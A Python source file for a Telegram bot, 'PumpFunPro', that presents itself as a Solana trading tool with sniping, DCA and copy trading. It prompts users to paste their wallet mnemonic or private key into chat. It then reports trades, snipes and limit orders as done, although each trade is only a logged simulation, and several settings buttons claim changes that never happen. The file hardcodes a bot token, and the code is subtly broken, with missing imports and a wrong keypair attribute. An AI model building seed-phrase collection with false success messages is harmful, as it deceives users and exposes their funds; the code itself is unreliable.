import json
import logging
import asyncio
from typing import Any, Dict, List, Optional
import base58
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solders.transaction import Transaction
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# =============================================================================
# 1. CONFIGURATION
# =============================================================================
TELEGRAM_TOKEN = "7594787474:AAFj8_wxiZXGcpNfFB2C77jBLQu9U0DP2A0"  # Replace with your actual token
RPC_URL = "https://api.mainnet-beta.solana.com"
COINGECKO_URL = "https://api.coingecko.com/api/v3/simple/price"
RAYDIUM_API_URL = "https://api-v3.raydium.io/pools/info/mint"
PUMP_WSS = "wss://pumpportal.fun/api/data"

# =============================================================================
# 2. GLOBAL STORAGE
# =============================================================================
user_wallets: Dict[int, Keypair] = {}
active_snipers: Dict[int, List[str]] = {}
user_settings: Dict[int, Dict[str, Any]] = {}
limit_orders: Dict[int, Dict[str, Any]] = {}
dca_orders: Dict[int, List[Dict[str, Any]]] = {}
trades: Dict[int, List[str]] = {}
referrals: Dict[int, str] = {}
supported_langs: List[str] = ['EN', 'ZH', 'ES', 'RU']
snipe_pools: List[Dict[str, Any]] = []
pending_orders: Dict[int, Dict[str, str]] = {}
pending_wallet: Dict[int, bool] = {}
connection_attempts: Dict[int, int] = {}

wallet_lock = asyncio.Lock()
orders_lock = asyncio.Lock()

# =============================================================================
# 3. LOGGING CONFIGURATION
# =============================================================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# =============================================================================
# 4. INITIALIZE CLIENTS
# =============================================================================
solana_client = AsyncClient(RPC_URL)

# =============================================================================
# 5. HELPER FUNCTIONS
# =============================================================================
async def get_sol_price() -> float:
    """Fetch SOL price from CoinGecko asynchronously."""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(
                COINGECKO_URL,
                params={"ids": "solana", "vs_currencies": "usd"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                data = await resp.json()
                return float(data.get("solana", {}).get("usd", 0))
        except Exception as e:
            logger.error(f"Error fetching SOL price: {e}")
            return 0.0

async def fetch_pool_id(token_address: str) -> Optional[str]:
    """Fetch Raydium pool ID dynamically for a given token."""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(
                RAYDIUM_API_URL,
                params={"mint1": token_address, "mint2": "So11111111111111111111111111111111111111112"}
            ) as resp:
                data = await resp.json()
                if data.get("success") and data.get("data", {}).get("data"):
                    return data["data"]["data"][0].get("id")
        except Exception as e:
            logger.error(f"Error fetching pool ID for {token_address}: {e}")
    return None

async def execute_trade(user_id: int, token_address: str, amount: float, action: str = "buy") -> bool:
    """Execute a trade on a DEX (Raydium placeholder)."""
    async with wallet_lock:
        if user_id not in user_wallets:
            logger.warning(f"Trade failed: No wallet for user {user_id}")
            return False
        wallet = user_wallets[user_id]

    balance_response = await solana_client.get_balance(wallet.public_key)
    balance = balance_response.value / 1e9 if balance_response.value else 0
    if balance < amount:
        logger.warning(f"Insufficient funds for user {user_id}: {balance} SOL < {amount} SOL")
        return False

    pool_id = await fetch_pool_id(token_address)
    if not pool_id:
        logger.error(f"No pool ID found for {token_address}")
        return False

    try:
        # Placeholder for actual DEX transaction
        logger.info(f"Simulated {action} of {amount} SOL for {token_address}")
        trades.setdefault(user_id, []).append(f"{action.upper()} {amount} {token_address}")
        return True
    except Exception as e:
        logger.error(f"Trade execution failed for user {user_id}: {e}")
        return False

async def process_wallet_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles Phantom wallet connections using mnemonic or private key."""
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id in connection_attempts and connection_attempts[user_id] >= 3:
        await update.message.reply_text("❌ Too many attempts. Try again later.")
        return

    if user_id not in connection_attempts:
        connection_attempts[user_id] = 0
    connection_attempts[user_id] += 1

    await update.message.reply_text("Connecting...")

    try:
        async with wallet_lock:
            if " " in text:  # Mnemonic phrase
                mnemonic_words = text.split()
                if len(mnemonic_words) not in [12, 24]:
                    await update.message.reply_text("❌ Invalid mnemonic: Must be 12 or 24 words")
                    return

                seed_bytes = Bip39SeedGenerator(text).Generate()
                bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
                keypair = Keypair.from_bytes(bip44_ctx.PrivateKey().Raw().ToBytes())
            else:  # Private key
                try:
                    if text.startswith('['):
                        key_bytes = bytes(json.loads(text))
                    else:
                        key_bytes = base58.b58decode(text)
                    
                    if len(key_bytes) == 32:
                        keypair = Keypair.from_seed(key_bytes)
                    elif len(key_bytes) == 64:
                        keypair = Keypair.from_bytes(key_bytes)
                    else:
                        await update.message.reply_text("❌ Invalid key length. Must be 32 or 64 bytes.")
                        return
                except Exception as e:
                    logger.error(f"Private key processing error: {str(e)}")
                    await update.message.reply_text("❌ Invalid private key format.")
                    return

            for attempt in range(3):
                try:
                    balance_response = await solana_client.get_balance(keypair.public_key)
                    if not balance_response.value:
                        raise ValueError("Received None balance")
                    balance_sol = balance_response.value / 1e9
                    user_wallets[user_id] = keypair
                    await update.message.reply_text(
                        f"✅ Wallet Connected!\n"
                        f"Address: {keypair.public_key}\n"
                        f"Balance: {balance_sol:.4f} SOL"
                    )
                    logger.info(f"Wallet connected for user {user_id}: {keypair.public_key}, Balance: {balance_sol} SOL")
                    return
                except Exception as e:
                    logger.warning(f"Balance check attempt {attempt + 1} failed: {e}")
                    if attempt < 2:
                        await asyncio.sleep(2 ** attempt)
                    else:
                        await update.message.reply_text(
                            "❌ Unable to verify wallet balance. Please try again later."
                        )
                        return

    except Exception as e:
        logger.error(f"Wallet connection error for user {user_id}: {str(e)}")
        await update.message.reply_text(
            "❌ Connection failed. Ensure:\n"
            "1. Valid 12/24-word mnemonic or private key\n"
            "2. Use Phantom's mainnet wallet\n"
            "3. Try /wallet again"
        )

# =============================================================================
# 6. COMMAND HANDLERS
# =============================================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display welcome message and main menu."""
    sol_price = await get_sol_price()
    user_id = update.effective_user.id
    wallet_info = "💳 Your Wallet\n      ↳ Not connected. Use /wallet to connect."
    
    async with wallet_lock:
        if user_id in user_wallets:
            wallet = user_wallets[user_id]
            balance_response = await solana_client.get_balance(wallet.public_key)
            balance = balance_response.value / 1e9 if balance_response.value else 0
            wallet_info = f"💳 Your Wallet\n      ↳ {wallet.public_key}\n      ↳ Balance: {balance:.4f} SOL"

    message = (
        f"💊 Welcome to PumpFunPro! 🔫\n\n"
        f"💰 SOL Price: ${sol_price:.2f}\n\n"
        f"{wallet_info}\n\n"
        "Your ultimate Solana trading assistant."
    )
    keyboard = [
        [InlineKeyboardButton("💳 Wallet", callback_data="wallet"),
         InlineKeyboardButton("🚀 Start Trading", callback_data="start_trading")],
        [InlineKeyboardButton("📊 Portfolio", callback_data="portfolio"),
         InlineKeyboardButton("⚙ Settings", callback_data="settings"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))

async def wallet_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Prompt user for wallet details."""
    user_id = update.effective_user.id
    await update.message.reply_text(
        "💼 Send your wallet details:\n"
        "- Mnemonic: 12/24 words (e.g., 'snap appear solid ...')\n"
        "- Private key: Base58 or byte array (e.g., '2aB3cD...' or '[1,2,3,...]')\n"
        "⚠️ Warning: Send this in a private chat with the bot!"
    )
    async with orders_lock:
        pending_wallet[user_id] = True

async def buysell(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Initiate a trade."""
    user_id = update.effective_user.id
    async with wallet_lock:
        if user_id not in user_wallets:
            await update.message.reply_text("❌ Please connect your wallet first using /wallet")
            return
    await update.message.reply_text("🔄 Enter token address and amount (e.g., TOKEN_ADDRESS, 1.0):")
    async with orders_lock:
        pending_orders[user_id] = {"action": "trade", "step": "details"}

async def sniper(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display sniper mode options."""
    keyboard = [
        [InlineKeyboardButton("🔫 Pump.fun", callback_data="sniperpump"),
         InlineKeyboardButton("🌕 Moonshot", callback_data="snipermoonshot")],
        [InlineKeyboardButton("📜 List Snipers", callback_data="listallsniperpump")]
    ]
    await update.message.reply_text("🎯 Choose sniper mode:", reply_markup=InlineKeyboardMarkup(keyboard))

async def sniperpump(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Activate Pump.fun sniper mode."""
    user_id = update.callback_query.from_user.id
    async with wallet_lock:
        if user_id not in user_wallets:
            await update.callback_query.answer("❌ Connect your wallet first using /wallet", show_alert=True)
            return
    async with orders_lock:
        active_snipers.setdefault(user_id, []).append("pump")
    await update.callback_query.answer("✅ Pump.fun sniper activated!")
    logger.info(f"Pump.fun sniper activated for user {user_id}")

async def listallsniperpump(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List active snipers."""
    user_id = update.effective_user.id
    async with orders_lock:
        active = active_snipers.get(user_id, [])
    await update.message.reply_text(f"🔍 Active Snipers: {', '.join(active) or 'None'}")

async def limitorders(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Manage limit orders."""
    keyboard = [
        [InlineKeyboardButton("➕ Create Limit", callback_data="create_limit"),
         InlineKeyboardButton("✏ Modify Limit", callback_data="modify_limit")]
    ]
    await update.message.reply_text("📈 Manage Limit Orders:", reply_markup=InlineKeyboardMarkup(keyboard))

async def dcaorders(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display DCA order instructions."""
    await update.message.reply_text("🔄 Usage: /createdca <TOKEN> <AMOUNT> <INTERVAL>\nExample: /createdca SOL 0.1 3600")

async def createdca(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Create a DCA order."""
    user_id = update.effective_user.id
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /createdca <TOKEN> <AMOUNT> <INTERVAL>")
        return
    try:
        token, amount, interval = context.args[0], float(context.args[1]), int(context.args[2])
        if amount <= 0 or interval <= 0:
            await update.message.reply_text("❌ Amount and interval must be positive")
            return
        async with wallet_lock:
            if user_id not in user_wallets:
                await update.message.reply_text("❌ Connect your wallet first using /wallet")
                return
        async with orders_lock:
            dca_orders.setdefault(user_id, []).append({"token": token, "amount": amount, "interval": interval})
        await update.message.reply_text(f"✅ DCA order created: {amount} {token} every {interval} seconds")
        asyncio.create_task(schedule_dca(user_id, token, amount, interval))
        logger.info(f"DCA order created for user {user_id}: {amount} {token} every {interval}s")
    except ValueError:
        await update.message.reply_text("❌ Invalid amount or interval format")

async def schedule_dca(user_id: int, token: str, amount: float, interval: int) -> None:
    """Schedule periodic DCA buys."""
    while True:
        await asyncio.sleep(interval)
        success = await execute_trade(user_id, token, amount, "buy")
        if success:
            await application.bot.send_message(user_id, f"🔄 DCA: Bought {amount} of {token}")
        else:
            logger.warning(f"DCA buy failed for user {user_id}: {amount} {token}")

async def copytrade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Initiate copy trading."""
    user_id = update.effective_user.id
    async with wallet_lock:
        if user_id not in user_wallets:
            await update.message.reply_text("❌ Connect your wallet first using /wallet")
            return
    await update.message.reply_text("👥 Enter trader's address to copy:")
    async with orders_lock:
        pending_orders[user_id] = {"action": "copytrade", "step": "address"}

async def monitor_trader(user_id: int, trader_address: str) -> None:
    """Monitor and copy trader's transactions (placeholder)."""
    try:
        trader_pubkey = Pubkey.from_string(trader_address)
        while True:
            signatures = await solana_client.get_signatures_for_address(trader_pubkey, limit=1)
            if signatures.value:
                sig = signatures.value[0].signature
                tx = await solana_client.get_transaction(sig)
                if "swap" in str(tx.value):
                    success = await execute_trade(user_id, "TOKEN_ADDRESS", 1.0, "buy")
                    if success:
                        await application.bot.send_message(user_id, f"👥 Copied trade: Bought 1.0 of TOKEN")
            await asyncio.sleep(60)
    except Exception as e:
        logger.error(f"Copy trading error for user {user_id}: {e}")

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display user portfolio."""
    user_id = update.effective_user.id
    async with wallet_lock:
        if user_id not in user_wallets:
            await update.message.reply_text("❌ No wallet connected. Use /wallet to connect.")
            return
        wallet = user_wallets[user_id]
        balance_response = await solana_client.get_balance(wallet.public_key)
        balance = balance_response.value / 1e9 if balance_response.value else 0
    async with orders_lock:
        trade_count = len(trades.get(user_id, []))
    await update.message.reply_text(f"📊 Portfolio:\nAddress: {wallet.public_key}\nBalance: {balance:.4f} SOL\nTrades: {trade_count}")

async def trades_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display recent trades."""
    user_id = update.effective_user.id
    async with orders_lock:
        user_trades = trades.get(user_id, [])
    await update.message.reply_text("📋 Recent Trades:\n" + "\n".join(user_trades[-3:]) if user_trades else "ℹ️ No trades yet.")

async def settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display settings menu."""
    keyboard = [
        [InlineKeyboardButton("⚡ Auto Buy", callback_data="autobuy"),
         InlineKeyboardButton("💸 Auto Sell", callback_data="autosell")],
        [InlineKeyboardButton("📉 Slippage", callback_data="slippage")]
    ]
    await update.message.reply_text("⚙ Settings:", reply_markup=InlineKeyboardMarkup(keyboard))

async def referral(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Provide referral code."""
    user_id = update.effective_user.id
    ref_code = f"REF-{str(user_id)[-6:].zfill(6)}"
    async with orders_lock:
        referrals[user_id] = ref_code
    await update.message.reply_text(f"📨 Referral Code: {ref_code}")

async def backupbots(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Backup instructions."""
    await update.message.reply_text("🔒 Use /exportsettings to backup settings (not implemented yet).")

async def tip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display tip tiers."""
    await update.message.reply_text("💰 Tip Tiers:\nBronze: 0.1 SOL\nSilver: 0.5 SOL\nGold: 1 SOL")

async def selectlang(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Language selection."""
    keyboard = [[InlineKeyboardButton(lang, callback_data=f"lang_{lang}")] for lang in supported_langs]
    await update.message.reply_text("🌍 Select Language:", reply_markup=InlineKeyboardMarkup(keyboard))

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display help message with usage instructions."""
    help_message = (
        "📚 Help Center\n\n"
        "**How to Use This Bot**\n"
        "Follow these steps to get started:\n\n"
        "1. **Connect Your Wallet**:\n"
        "   - Type `/wallet` and send your 12/24-word mnemonic or private key.\n"
        "   - ⚠️ **Important**: Do this in a private chat—never share your wallet details publicly!\n\n"
        "2. **Start Trading**:\n"
        "   - Use `/buysell` to trade tokens.\n"
        "   - Example: `/buysell TOKEN_ADDRESS, 1.0` to trade 1.0 of a token.\n\n"
        "3. **Snipe New Tokens**:\n"
        "   - Use `/sniper` to enable sniper mode.\n"
        "   - Select 'Pump.fun' to automatically buy new tokens on launch.\n\n"
        "4. **Set Up DCA (Dollar-Cost Averaging)**:\n"
        "   - Use `/createdca <TOKEN> <AMOUNT> <INTERVAL>` to automate buys.\n"
        "   - Example: `/createdca SOL 0.1 3600` buys 0.1 SOL every hour.\n\n"
        "5. **Copy Trade**:\n"
        "   - Use `/copytrade` and provide a trader’s Solana address to mimic their trades.\n\n"
        "6. **Check Your Portfolio**:\n"
        "   - Use `/profile` to view your wallet balance and trade stats.\n\n"
        "7. **Adjust Settings**:\n"
        "   - Use `/settings` to customize auto buy/sell options and slippage.\n\n"
        "That’s it! For more info, try each command individually. Happy trading! 💊"
    )
    await update.message.reply_text(help_message)

# =============================================================================
# 7. CALLBACK QUERY ROUTER
# =============================================================================
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline button callbacks."""
    data = update.callback_query.data
    user_id = update.callback_query.from_user.id

    handlers = {
        "wallet": lambda: context.bot.send_message(user_id, "💼 Send wallet details (mnemonic/private key):"),
        "start_trading": lambda: buysell(update, context),
        "portfolio": lambda: profile(update, context),
        "settings": lambda: settings(update, context),
        "help": lambda: help_handler(update, context),
        "sniperpump": lambda: sniperpump(update, context),
        "listallsniperpump": lambda: listallsniperpump(update, context),
        "snipermoonshot": lambda: None,  # Placeholder
        "autobuy": lambda: update.callback_query.answer("✅ Auto Buy toggled", show_alert=True),
        "autosell": lambda: update.callback_query.answer("✅ Auto Sell toggled", show_alert=True),
        "slippage": lambda: update.callback_query.answer("✅ Slippage set to 0.5%", show_alert=True),
        "create_limit": lambda: context.bot.send_message(user_id, "📈 Send: TOKEN, PRICE, QUANTITY"),
        "modify_limit": lambda: context.bot.send_message(user_id, "✏ Send: TOKEN, PRICE, QUANTITY"),
    }
    if data in handlers:
        await handlers[data]()
        await update.callback_query.answer()
    elif data.startswith("lang_"):
        lang = data.split("_")[1]
        async with orders_lock:
            user_settings.setdefault(user_id, {})["language"] = lang
        await update.callback_query.answer(f"Language set to {lang}")

    if data in ["wallet", "create_limit", "modify_limit"]:
        async with orders_lock:
            pending_orders[user_id] = {"action": data}

# =============================================================================
# 8. PENDING INPUT HANDLER
# =============================================================================
async def pending_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle user input for pending actions."""
    user_id = update.effective_user.id
    text = update.message.text.strip()

    async with orders_lock:
        if user_id in pending_wallet:
            await process_wallet_key(update, context)
            del pending_wallet[user_id]
            return
        if user_id not in pending_orders:
            return
        order = pending_orders[user_id]

    if order["action"] == "trade":
        try:
            token_address, amount = [x.strip() for x in text.split(",")]
            amount = float(amount)
            if amount <= 0:
                await update.message.reply_text("❌ Amount must be positive")
                return
            success = await execute_trade(user_id, token_address, amount, "buy")
            await update.message.reply_text("✅ Trade executed" if success else "❌ Trade failed")
            del pending_orders[user_id]
        except ValueError:
            await update.message.reply_text("❌ Invalid input format: Use TOKEN_ADDRESS, AMOUNT")
        except Exception as e:
            logger.error(f"Trade input error for user {user_id}: {e}")
            await update.message.reply_text(f"❌ Error: {e}")
    elif order["action"] in ["create_limit", "modify_limit"]:
        try:
            token, price, quantity = [x.strip() for x in text.split(",")]
            price = float(price)
            quantity = float(quantity)
            if price <= 0 or quantity <= 0:
                await update.message.reply_text("❌ Price and quantity must be positive")
                return
            order_data = {"token": token, "price": price, "quantity": quantity}
            success = await execute_trade(user_id, token, quantity)
            await update.message.reply_text(f"✅ Limit order {'created' if order['action'] == 'create_limit' else 'modified'}")
            async with orders_lock:
                limit_orders[user_id] = order_data
                del pending_orders[user_id]
        except ValueError:
            await update.message.reply_text("❌ Invalid format: Use TOKEN, PRICE, QUANTITY")
        except Exception as e:
            logger.error(f"Limit order error for user {user_id}: {e}")
            await update.message.reply_text(f"❌ Error: {e}")
    elif order["action"] == "copytrade":
        try:
            trader_address = text
            Pubkey.from_string(trader_address)
            trades.setdefault(user_id, []).append(f"Copying {trader_address}")
            await update.message.reply_text(f"✅ Copy trading activated for {trader_address}")
            asyncio.create_task(monitor_trader(user_id, trader_address))
            del pending_orders[user_id]
        except Exception as e:
            logger.error(f"Copy trade setup error for user {user_id}: {e}")
            await update.message.reply_text("❌ Invalid trader address")

# =============================================================================
# 9. WEBSOCKET MONITORING
# =============================================================================
async def monitor_pump_launches() -> None:
    """Monitor new token pools via WebSocket for sniping."""
    reconnect_delay = 5
    while True:
        try:
            async with websockets.connect(PUMP_WSS, ping_interval=20) as ws:
                logger.info("Connected to Pump WebSocket")
                async for message in ws:
                    data = json.loads(message)
                    if data.get("type") == "new_pool":
                        token_address = data.get("token")
                        async with orders_lock:
                            snipe_pools.append(data)
                            for uid, modes in active_snipers.items():
                                if "pump" in modes:
                                    success = await execute_trade(uid, token_address, 1.0, "buy")
                                    if success:
                                        await application.bot.send_message(uid, f"🎯 Sniped 1.0 of {token_address}")
                                    else:
                                        logger.warning(f"Snipe failed for user {uid}: {token_address}")
        except Exception as e:
            logger.error(f"WebSocket error: {e}")
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, 60)

# =============================================================================
# 10. MAIN APPLICATION SETUP
# =============================================================================
application = None

def main() -> None:
    """Start the bot and ensure continuous operation."""
    global application
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    commands = {
        "start": start, "wallet": wallet_prompt, "sniper": sniper, "limitorders": limitorders,
        "dcaorders": dcaorders, "createdca": createdca, "copytrade": copytrade, "profile": profile,
        "trades": trades_handler, "buysell": buysell, "settings": settings, "referral": referral,
        "backupbots": backupbots, "tip": tip, "selectlang": selectlang, "help": help_handler
    }
    for cmd, handler in commands.items():
        application.add_handler(CommandHandler(cmd, handler))

    application.add_handler(CallbackQueryHandler(callback_router))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, pending_input_handler))

    loop = asyncio.get_event_loop()
    loop.create_task(monitor_pump_launches())
    logger.info("Bot started")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
